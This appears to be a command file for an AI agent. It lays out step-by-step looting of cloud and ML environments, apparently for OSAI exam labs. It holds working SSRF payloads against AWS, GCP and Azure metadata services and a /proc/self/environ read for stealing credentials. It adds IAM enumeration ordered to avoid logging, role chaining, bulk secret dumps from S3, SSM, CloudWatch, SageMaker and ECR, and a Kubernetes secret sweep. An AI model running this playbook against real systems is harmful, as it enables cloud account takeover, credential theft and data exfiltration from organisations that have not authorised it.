Loot a cloud/ML environment after an SSRF, exposed metadata, or leaked key. $ARGUMENTS = context: SSRF URL, target endpoint, or "have creds" + provider. Covers AWS (primary in OSAI), GCP, Azure, and Kubernetes. Write results to ~/osai/current/loot/cloud_loot.md.

## Background
The AI web app is usually the door; the cloud account behind it is the prize.
Chain: SSRF/exposed-env → metadata creds → IAM enumerate → role chain → secrets → model/data/DC.

## Phase 1: Get the first credential

### 1a. SSRF → AWS IMDS (try IMDSv1 first, then v2)
```bash
# IMDSv1 (no token)
curl -s "<SSRF>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "<SSRF>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>"

# IMDSv2 (token required) — two-step via SSRF that allows headers, else PUT
TOKEN via: PUT http://169.254.169.254/latest/api/token  (header X-aws-ec2-metadata-token-ttl-seconds: 21600)
then GET .../security-credentials/<ROLE> with header X-aws-ec2-metadata-token: <TOKEN>
```

### 1b. SSRF → file read → Lambda / container env (very common OSAI pattern)
```bash
curl -s "<APIGW_URL>/prod/api/export?template_url=file:///proc/self/environ" \
  | tr '\0' '\n' | grep -E '^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|BACKEND_ROLE_ARN|SAGEMAKER_ENDPOINT)='
```

### 1c. GCP / Azure metadata (if not AWS)
```bash
# GCP (needs Metadata-Flavor: Google header)
curl -s "<SSRF>?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Azure IMDS
curl -s "<SSRF>?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Phase 2: Configure and confirm identity
```bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity     # who am I, which account
```

## Phase 3: Enumerate IAM (stealth order — inline policies leak most, least logged)
```bash
aws iam list-role-policies --role-name <ROLE>                       # inline first
aws iam get-role-policy --role-name <ROLE> --policy-name <POLICY>
aws iam list-attached-role-policies --role-name <ROLE>             # may be denied
aws iam get-role --role-name <ROLE> --query 'Role.AssumeRolePolicyDocument'
aws iam list-roles --query 'Roles[].RoleName'
```

## Phase 4: Role chaining (Megacorp-style ladder)
Pattern: Lambda/EC2 role → DataScientistRole → MLOpsRole → SageMakerExecutionRole
```bash
aws sts assume-role --role-arn arn:aws:iam::<ACCT>:role/<NEXT_ROLE> --role-session-name loot
# export the returned creds, re-run get-caller-identity, repeat up the chain
```
Look at each role's AssumeRolePolicyDocument to see who it trusts = your next hop.

## Phase 5: Secrets hunting — 5 services
```bash
# S3 (incl. deleted-file recovery via versions)
aws s3 ls && aws s3 ls s3://<BUCKET>/ --recursive
aws s3api list-object-versions --bucket <BUCKET>

# SSM Parameter Store — history recovers ROTATED / old passwords
aws ssm describe-parameters
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
aws ssm get-parameter-history --name "<PARAM>" --with-decryption

# CloudWatch logs — grep for secrets
aws logs describe-log-groups
aws logs filter-log-events --log-group-name "<G>" --filter-pattern "password OR key OR secret OR token"

# SageMaker model registry — Container.Environment holds tokens
aws sagemaker list-model-package-groups
aws sagemaker describe-model-package --model-package-name <ARN>

# ECR image env
aws ecr get-login-password | docker login --username AWS --password-stdin <ACCT>.dkr.ecr.<REGION>.amazonaws.com
docker pull <IMAGE> && docker inspect --format '{{json .Config.Env}}' <IMAGE> | jq -r '.[]'
```

## Phase 6: EC2 / exposed inference
```bash
aws ec2 describe-instances --filters "Name=instance-state-name,Values=running" \
  --query 'Reservations[*].Instances[*].{ID:InstanceId,IP:PublicIpAddress,SG:SecurityGroups[0].GroupName}'
curl -s http://<PUBLIC_IP>:8000/v1/models | jq     # unauth vLLM/OpenAI-compatible check
curl -s http://<PUBLIC_IP>:8000/version | jq       # version → CVE research
```

## Phase 7: Kubernetes (if kubeconfig / SA token found)
```bash
# In-pod service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl --token=<TOK> auth can-i --list
# Kubeconfig cert identity (look for O=system:masters)
kubectl config view --raw -o jsonpath='{.users[0].user.client-certificate-data}' \
  | base64 -d | openssl x509 -text -noout | grep Subject
kubectl get secrets -A          # cluster-wide secret sweep if RBAC allows
```

## Output — log each as a finding
For every credential/secret recovered:
```
/osai-cred-vault --add --host <service> --user <arn/name> --secret <value> --type cloud --source <s3|ssm|imds|...>
```
Write the full chain to ~/osai/current/loot/cloud_loot.md:
```
ENTRY: <SSRF/exposed env>
IDENTITY: <initial role>
CHAIN: role1 → role2 → role3
SECRETS: <what, from which service>
IMPACT: <model replacement | data exfil | DC pivot | account takeover>
MITRE ATLAS: AML.T0057 (LLM Data Leakage) / AML.T0055 as applicable
```

## Token discipline
- Never dump full aws-cli JSON into chat — jq only the fields you need
- One `describe`/`list` at a time; follow the trust chain, don't brute every API
